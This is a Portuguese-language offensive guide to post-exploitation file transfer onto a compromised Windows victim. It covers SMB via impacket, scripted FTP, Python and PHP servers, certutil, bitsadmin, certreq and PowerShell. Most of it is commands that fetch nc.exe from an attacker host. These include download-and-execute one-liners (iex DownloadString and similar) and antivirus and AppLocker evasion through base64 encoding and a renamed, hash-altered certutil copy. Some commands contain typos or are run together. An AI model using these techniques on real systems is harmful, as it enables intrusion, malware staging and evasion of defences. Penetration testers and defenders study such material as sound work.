# Transferência de Arquivos entre Atacante e Vítima

## Introdução

Na etapa de pós-exploração, é comum a necessidade de transferir arquivos entre o atacante e o alvo. De acordo com a cadeia de exploração do Mitre ATT&CK, essa técnica é descrita como [Ingress Tool Transfer - T1105](https://attack.mitre.org/techniques/T1105/).

O procedimento de fazer o upload ou download de arquivos para a máquina comprometida é crucial, porém, sua execução pode variar de acordo com o sistema operacional e suas características específicas. Durante essa fase da atividade é possível encontrar obstáculos que precisam ser superados, como sistemas de segurança, firewall, applocker dentre outros

Com o objetivo de abordar esse aspecto específico, este segmento da documentação concentra-se em apresentar as principais técnicas que podem ser empregadas para efetuar a transferência de arquivos entre o atacante e a vítima na plataforma Windows.

## Server Message Block (SMB)

O Server Message Block (SMB) é um protocolo de rede utilizado em sistemas operacionais Windows para compartilhamento de arquivos, impressoras e recursos em uma rede local. Ele permite que computadores em uma rede acessem e compartilhem dados de forma transparente, facilitando a colaboração e o compartilhamento de recursos entre diferentes dispositivos. O SMB é amplamente utilizado para acessar pastas compartilhadas, transferir arquivos e executar tarefas de impressão em ambientes de rede baseados em Windows.

### Instalação e configuração (Máquina Linux - Atacante)

Para realizar o compartilhamento via SMB vamos utilizar o utilitário Impacket que consiste em um conjunto de classes e ferramentas em Python para implementar, manipular e trabalhar com diversos protocolos de redes (IP, TCP, UDP, ICMP, SMB, HTTP, LDAP). 

Nas versões mais recentes do Kali, o Impacket já vem instalado por padrão, mas caso esteja utilizando outra distribuição Linux, siga as etapas abaixo para instalar o Impacket.

1. Realize o update do sistema e instale o Python3 e Pip3

```bash
sudo apt update && sudo apt install python3-pip python3-dev libffi-dev libssl-dev
```

2. Utilizando o pip3, instale o Impacket   

```bash
sudo pip3 install impacket
```

3. Adicione o Impacket ao Path do sistema

```bash
export PATH=$PATH:"/usr/share/doc/python3-impacket/examples/"
```

4. Esse é um passo opcional, caso queira facilitar a chamada dos scripts, crie um link simbólico:

```bash
sudo ln -s /usr/share/impacket/script /usr/bin/impacket-smbserver
```

### Compartilhamento de arquivos (Máquina Linux - Atacante)

Após a instalação e configuração, podemos seguir com o processo de disponibilização do arquivo para download. Para isso, siga os passos abaixo:

1. Crie uma pasta e mova o arquivo que deseja baixar para dentro dela, nesse exemplo usarei o nc.exe:
   
```bash
mkdir -p /tmp/shared/ ; cd /tmp/shared/
```

```bash
cp -v /usr/share/windows-binaries/nc.exe .
```
   
2. Para realizar o compartilhamento sem senha execute o comando abaixo:

```bash
sudo impacket-smbserver file /tmp/shared/ -smb2support
```

3. Para realizar o compartilhamento com senha execute o comando abaixo:

```bash
sudo impacket-smbserver -username kirito -password kirito file /tmp/shared/ -smb2support
```

Uma vez com todas essas etapas configuradas, podemos seguir para o ambiente Windows - Vítima para realizar o processo de download.

### Processo de Download (Máquina Windows - Vítima)

Para realizar o download da ferramenta/arquivo disponibilizado nas etapas anteriores abra um cmd ou powershell e siga as etapas abaixo:

1. Acesse a pasta onde deseja realizar o download:

```poweshell
cd \Windows\tasks
```

2. Conecte ao endereço de compartilhamento:

```powershell
net use * \\192.168.0.10\file
```

3. Verifique se a conexão foi estabelecida com sucesso:

```powershell
net use
```

4. Acesse a pasta compartilhada:
```powershell
dir z:\
```

5. Copie o arquivo desejado:

```powershell
copy z:\nc.exe .
```

6. Realize o processo de desmontagem da pasta compartilhada:

```powershell
net use * /del /y
```

### Aviso

O protocolo SMB é uma excelente opção para o atacante realizar operações de upload/download de arquivos. No entanto, o tráfego SMB direcionado para fora do perímetro de uma LAN pode ser considerado suspeito na maioria dos casos. É comum que esse tipo de conexão seja bloqueado pelo firewall da organização.

Nesse contexto, é aconselhável optar por protocolos de rede como HTTP e FTP para disponibilizar arquivos. Esses protocolos são mais comuns e podem se camuflar de maneira mais eficiente no tráfego normal da organização, tornando as atividades do atacante mais difíceis de serem detectadas.

## File Transfer Protocol (FTP)

O File Transfer Protocol (FTP) é um protocolo de rede que possibilita a transferência de arquivos entre um computador cliente e um servidor através de uma conexão de rede, como a internet. Ele permite que os usuários façam o upload (envio) e download (recebimento) de arquivos para ou a partir do servidor, facilitando o compartilhamento de dados entre sistemas remotos de forma simples e eficiente. O FTP é amplamente utilizado para transferir arquivos, realizar atualizações de software, fazer backup de dados e gerenciar conteúdo em servidores web, entre outras aplicações. No entanto, é importante notar que o FTP não oferece criptografia por padrão, o que pode tornar a transferência de dados insegura, sendo recomendado o uso de variantes seguras do protocolo, como FTPS (FTP Secure) ou SFTP (SSH File Transfer Protocol), para garantir a proteção dos dados durante a transferência.

### Instalação e configuração (Máquina Linux - Atacante)

Para realizar o compartilhamento via FTP vamos utilizar a biblioteca pyftp, para realizar a instalação siga as etapas abaixo:

1. Realize o update do sistema e instale o Python3, Pip3 e a biblioteca pyftp

```bash
sudo apt-get update ; apt install python3 pip3 python3-pyftpdlib
```

### Compartilhamento de arquivos (Máquina Linux - Atacante)

Após a instalação e configuração podemos seguir com o processo de disponibilização do arquivo para Download. Para isso siga os passos abaixo:

1. Crie uma pasta e mova o arquivo que deseja baixar para dentro dela:
   
```bash
mkdir -p /tmp/shared/ ; cd /tmp/shared/
```
   
```bash
cp -v /usr/share/windows-binaries/nc.exe .
```

2. Suba o servidor ftp

```bash
sudo python -m pyftpdlib -p 21 -u kirito -P kirito
```

Uma vez com todas essas etapas configuradas, podemos seguir para o ambiente Windows - Vítima para realizar o processo de Download.

### Processo de Download (Máquina Windows - Vítima)

Geralmente quando conquistamos um terminal no Windows esse terminal não é interativo, desse modo precisamos realizar alguns passos a mais para conseguir realizar o download usando o FTP, para isso siga as etapas abaixo:

1. Abra um terminal cmd ou powershell e crie um arquivo de conexão ao servidor FTP do atacante contendo os comandos/instruções a serem executados sequencialmente:

```powershell
echo open 172.16.192.200> ftp.txt
```

```powershell
echo USER kirito>> ftp.txt
```

```powershell
echo kirito>> ftp.txt
```

```powershell
echo bin>> ftp.txt
```

```powershell
echo GET nc.exe>> ftp.txt
```

```powershell
echo bye>> ftp.txt
```

2. Faça o download do arquivo executando as instruções do arquivo texto "ftp.txt"

```bash
ftp -v -n -s:ftp.txt
```

3. Para realizar todos os passos acima em uma única linha utilize o comando abaixo:

```bash
cmd /c "@echo open 172.16.192.200>ftp.txt&@echo USER kirito>>ftp.txt&@echo kirito>>ftp.txt&@echo bin>>ftp.txt&@echo GET nc.exe>>ftp.txt&@echo bye>>ftp.txt&@ftp -v -n -s:ftp.txt"
```

## Python Server

Python Server, também conhecido como servidor Python, é um termo geralmente utilizado para se referir a um servidor web que foi implementado usando a linguagem de programação Python. Em outras palavras, é um software que pode receber solicitações HTTP (como acessar páginas da web) e fornecer respostas a essas solicitações usando Python como linguagem principal para processamento.

Existem diversas bibliotecas e frameworks em Python que permitem a criação de servidores web, como o Flask e o Django. Essas ferramentas facilitam a criação de aplicativos web, APIs (Interfaces de Programação de Aplicativos) e serviços diversos que podem ser executados em um servidor Python.

Um servidor Python pode ser usado para hospedar sites, aplicativos web, serviços de backend, APIs e muito mais. Sua natureza flexível e a vasta quantidade de bibliotecas disponíveis tornam o Python uma escolha popular para desenvolvedores web que desejam criar soluções robustas e escaláveis.

### Instalação e configuração (Máquina Linux - Atacante)

Geralmente em algumas versões do Linux o Python3 já vem instalado, caso ainda não possua esse utilitário siga as etapas abaixo:

1. Atualize o sistema e instale o Pyhton3 e Pip3

```bash
sudo apt update && sudo apt install python3 python3-pip
```

### Compartilhamento de arquivos (Máquina Linux - Atacante)

Após a instalação e configuração podemos seguir com o processo de disponibilização do arquivo para Download. Para isso siga os passos abaixo:

1. Crie uma pasta e mova o arquivo que deseja baixar para dentro dela, nesse exemplo usarei o nc.exe:
   
```bash
mkdir -p /tmp/shared/ ; cd /tmp/shared/
```

```bash
cp -v /usr/share/windows-binaries/nc.exe .
```
   
2. Suba o servidor python

Python3

```bash
sudo python -m http.server 80
```

Python2

```bash
sudo python2 -m SimpleHTTPServer 80
```

Uma vez com todas essas etapas configuradas, podemos seguir para o ambiente Windows - Vítima para realizar o processo de Download.

### Aviso

Diferente do Linux que possui vários utilitários de linhas de comando como wget e curl para realizar o download de arquivos da internet o Windows não possui exatamente esses mesmos recursos, desse modo para realizar download de arquivos através de um servidor web podemos utilizar o Certutil, BITSAdmin e Powershell. Abaixo será demonstrado como realizar o processo de download utilizando essas ferramentas.

### Processo de Download com Certutil (Máquina Windows - Vítima) 

Certutil é uma ferramenta de linha de comando presente nos sistemas operacionais Windows que tem diversas funcionalidades relacionadas à gestão de certificados digitais e arquivos criptográficos. Esse utilitário permite realizar operações como instalar, visualizar, exportar e gerar certificados, além de executar verificações de assinaturas digitais, calcular hashes e muito mais. Em resumo, o Certutil é uma ferramenta versátil que desempenha um papel essencial na administração de certificados e na validação de arquivos em ambientes Windows, embora não seja bem documentado pela Microsoft esse binário pode ser utilizado para realizar download de arquivos.

Para realizar o download com certutil siga as etapas abaixo:

1. Abra um terminal cmd ou powershell e execute o comando abaixo:

```powershell
certutil.exe -urlcache -split -f http://IP_ATACANTE/nc.exe nc.exe
```

2. Verifique o hash do arquivo

```powershell
certutil.exe -hashfile nc.exe md5
```

### Processo de Download com Certutil com dados em base64 (Máquina Windows - Vítima) 

Uma característica interessante do certutil.exe é a capacidade de processar uma informação codificada em Base64 para o arquivo original, ou seja, podemos tomar a representação base64 do executável nc.exe, colocar num arquivo texto, fazer o download via certutil.exe e transformar o texto novamente no executável

Essa é uma forma de o atacante evitar levantar suspeitas e tentar contornar algumas proteções (bypass) de IDS/IPS e Antivírus

Na máquina do atacante, transforme o executável nc.exe em um arquivo texto, que é a representação em base64

```bash
cat nc.exe | base64 > nc.txt
```

Na máquina vítima, realize o processo de decode e download

```bash
certutil -urlcache -split -f "http://IP_ATACANTE/nc.txt" nc.txt
```
```bash
certutil -decode nc.txt nc.exe
```
ou
```bash
certutil.exe -urlcache -split -f "http://IP_ATACANTE/nc.txt" nc.txt && certutil.exe -decode nc.txt nc.exe
```

### Formas de deixar o certutil mais stealth  

Baseado na campanha de ataque à cadeia de suprimentos da empresa Kaseya, é possível identificar nos Indicadores de Comprometimento (IoC) uma técnica interessante para modificar a assinatura do binário "certutil" e evitar detecções por antivírus. É importante notar que, embora essa técnica possa não funcionar em ambientes atualizados, ainda pode ser eficaz em sistemas legados.

Para replicar o processo dessa campanha, siga as etapas abaixo:

1. Faça uma cópia do binário original em outra pasta com um nome diferente:

```powershell
copy \windows\system32\certutil.exe \windows\tasks\cert.exe
```

2. Acrescente um conjunto de bytes aleatórios ao final do arquivo:

```powershell
echo %RANDOM% >> \windows\tasks\cert.exe
```

3. Realize o download do arquivo:

```bash
cert.exe -urlcache -split -f "http://IP_ATACANTE/nc.txt" nc.txt && cert.exe -decode nc.txt nc.exe
```

Com essas etapas, o atacante busca alterar o hash do arquivo, o nome e a localização, na tentativa de contornar as soluções de antivírus e de controle de aplicação, como o AppLocker do Windows.

### Processo de Download com BITSAdmin (Máquina Windows - Vítima) 

O BITSAdmin é uma poderosa ferramenta de linha de comando do Windows, projetada para administrar o serviço Background Intelligent Transfer Service (BITS). Essa ferramenta é especialmente valiosa em ambientes de rede, oferecendo aos administradores o controle preciso sobre o agendamento e o progresso das transferências de arquivos em segundo plano. Isso não só otimiza o uso da largura de banda disponível, mas também garante que as transferências ocorram de forma eficiente, sem prejudicar o desempenho geral do sistema.

A flexibilidade do BITSAdmin se destaca, pois permite aos administradores pausar, reiniciar e cancelar tarefas de transferência em andamento. Com essa capacidade, é possível gerenciar facilmente as operações de download e upload executadas pelo BITS, proporcionando um ambiente de rede mais controlado e seguro.

Outro benefício notável do BITSAdmin é a sua utilidade na transferência de arquivos grandes, tornando-o uma escolha ideal para lidar com downloads de alto volume. Além disso, é utilizado pelo sistema operacional para realizar os downloads de atualizações do Windows, tornando sua utilização mais discreta e menos suscetível a detecções indesejadas pelos sistemas de segurança.

Uma funcionalidade bastante apreciada é a capacidade de retomar downloads interrompidos. Caso uma transferência seja interrompida, o BITSAdmin permite que o processo seja reiniciado exatamente de onde parou, economizando tempo e recursos.

Existe algumas formas de realizar o download com BITSAdmin, abaixo serão demonstradas 2 formas de realizar esse processo:

**Primeira Forma:**

1. Crie um trabalho bitsadmin chamado 1, adicione cmd.exe ao trabalho, configure o trabalho para executar o comando de destino e, em seguida, retome e conclua o trabalho.

```powershell
bitsadmin /create 1 bitsadmin /addfile 1 http://IP_ATACANTE/nc.exe c:\data\playfolder\nc.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```

**Segunda Forma:**

1. Abra um terminal cmd ou powershell e execute o comando abaixo:

```powershell
bitsadmin /transfer <nome_do _job> /priority foreground http://IP_ATACANTE/nc.exe c:\temp\nc.exe
```

### Processo de Download com Powershell (Máquina Windows - Vítima) 

Com certeza essa deve ser a forma mais conhecida de realizar download de arquivos em ambientes Windows, provavelmente você já deve ter usado e abusado dela muito durante o trabalho ou durante CTF's. O PowerShell é uma interface de linha de comando e uma linguagem de script desenvolvida pela Microsoft para sistemas Windows. Ela permite que os usuários interajam com o sistema operacional e realizem uma variedade de tarefas, desde tarefas simples até automações complexas. O PowerShell é especialmente poderoso para administração de sistemas, automação de tarefas e configuração de ambientes Windows. Ele oferece acesso a uma ampla gama de comandos, chamados de cmdlets, que permitem executar diversas operações, gerenciando arquivos, processos, usuários, redes e muito mais.

Se você está utilizando uma versão mais atual do Windows, é possível usar os comandos **`wget`** ou **`curl`**, pois ambos são aliases para o **`Invoke-WebRequest`**. Para verificar mais informações sobre o comando, basta digitar **`Get-Help Invoke-WebRequest`** no PowerShell.

A flexibilidade do PowerShell possibilita várias formas de realizar o download de arquivos utilizando o **`Invoke-WebRequest`**, e a seguir, serão demonstrados alguns exemplos práticos desses modos.

1. Invoke Webrequest

```powershell
invoke-webrequest -uri "http://IP_ATACANTE/nc.exe" -outfile "nc.exe"
```

2. Wget

```powershell
powershell -c "wget 'http://IP_ATACANTE/nc.exe' -outfile 'nc.exe'
```

3. Web Client

```powershell
(new-object web.client).downloadfile("http://IP_ATACANTE/nc.exe","c:/path/to/nc.exe")
```

4. Invoke Webrequest DownloadString 

```powershell
iex (New-Object Net.WebClient).DownloadString('http://IP_ATACANTE/nc.exe')
```

5. Internet Explorer

```powershell
$ie = New-Object -ComObject InternetExplorer.Application; $ie.visible=$False; $ie.navigate('http://IP_ATACANTE/nc.exe'); sleep 5; $response = $ie.Document.body.innerHTML; $ie.quit(); iex $response
```

6. Internet Explorer com Invoke Webrequest

```powershell
iex (iwr 'http://IP_ATACANTE/nc.exe')
```

7. XML Msxm12.XMLHTTP

```powershell
$h = New-Object -ComObject Msxm12.XMLHTTP; $h.open('GET', 'http://IP_ATACANTE/nc.exe', $False); $h.send(); iex $h.responseText
```

8. DotNet System.NET.WebRequest

```powershell
$wr = [System.NET.WebRequest]::Create("http://IP_ATACANTE/nc.exe"); $r = $wr.GetResponse(); IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

## PHP e Certreq

PHP Server é um software que permite a execução de aplicativos e scripts PHP em um servidor local. Ele funciona como um ambiente de desenvolvimento que simula um servidor web real em um computador local ou em uma rede interna. Isso permite que desenvolvedores testem e depurem suas aplicações PHP antes de implantá-las em um servidor de produção. O PHP Server é uma ferramenta útil para criar e testar websites ou aplicações que dependem da linguagem de programação PHP.

Certreq é uma ferramenta de linha de comando utilizada em sistemas Windows para solicitar e emitir certificados digitais a partir de uma Autoridade de Certificação (AC) ou uma infraestrutura de chave pública (PKI). Essa ferramenta é comumente empregada para realizar a solicitação de certificados de segurança para diversos fins, como autenticação, criptografia de dados, assinaturas digitais e outros processos que envolvam o uso de chaves públicas e privadas. O "certreq" permite aos administradores e usuários gerenciem a emissão e instalação de certificados, proporcionando uma forma segura de garantir a autenticidade e a confidencialidade das informações em um ambiente Windows. Apesar de não ser bem documentado é possível utilizar o certreq para realizar download de arquivos.

### Instalação e configuração (Máquina Linux - Atacante)

Para instalar a versão mais recente do PHP, siga os passos abaixo:

```bash
sudo apt-get update && sudo apt-get upgrade ; sudo apt-get install php
```

### Compartilhamento de arquivos (Máquina Linux - Atacante)

O certreq trabalha apenas com arquivos menores que 50 KB. Portanto, quando lidando com arquivos maiores, é necessário dividi-los em partes menores para realizar a conversão. Neste cenário, utilizaremos o arquivo "nc.exe", que possui cerca de 59.392 KB. Dividiremos esse arquivo em dois arquivos de texto para, posteriormente, unificá-los e restaurá-los na máquina da vítima.

A seguir, explicaremos os passos para realizar o compartilhamento de arquivos:

1. Identifique o tamanho do arquivo:

```bash
ls -lah
```

2. Divida-o em tamanhos menores:

```bash 
split -d -n 2 nc.txt part
```

3. Inicie o servidor PHP com o seguinte comando:

> O binário "certreq" utiliza o método POST para a requisição HTTP. Para garantir que o download ocorra sem problemas, é necessário utilizar o servidor PHP, em vez do Python. 
>

```bash
sudo php -S 0.0.0.0:80
```

### Processo de Download com Certreq (Máquina Windows - Vítima)  

Para realizar o download da ferramenta/arquivo disponibilizado nas etapas anteriores abra um cmd ou powershell e siga as etapas abaixo:

1. Faça o download das partes do arquivo texto do Netcat:

```powershell
certreq -post -config http://172.16.192.200/part00 \windows\win.ini part00.txt
```

```powershell
certreq -post -config http://172.16.192.200/part01 \windows\win.ini part01.txt
```

2. Junte as partes do arquivo texto que representam o base64 do Netcat:

```powershell
for %f in (*.txt) do type %f >> output
```

3. Decodifique e restaure o binário do Netcat:

```powershell
certutil -decode output nc.exe
```

## Conclusão

Em suma, o Windows oferece diversas maneiras de realizar o download de arquivos, e as mencionadas acima são apenas algumas delas. Caso deseje explorar ainda mais opções, recomendo visitar o site [LOLBAS](https://lolbas-project.github.io/#/download), onde você encontrará informações detalhadas sobre outras formas de executar downloads de forma eficiente no sistema operacional Windows.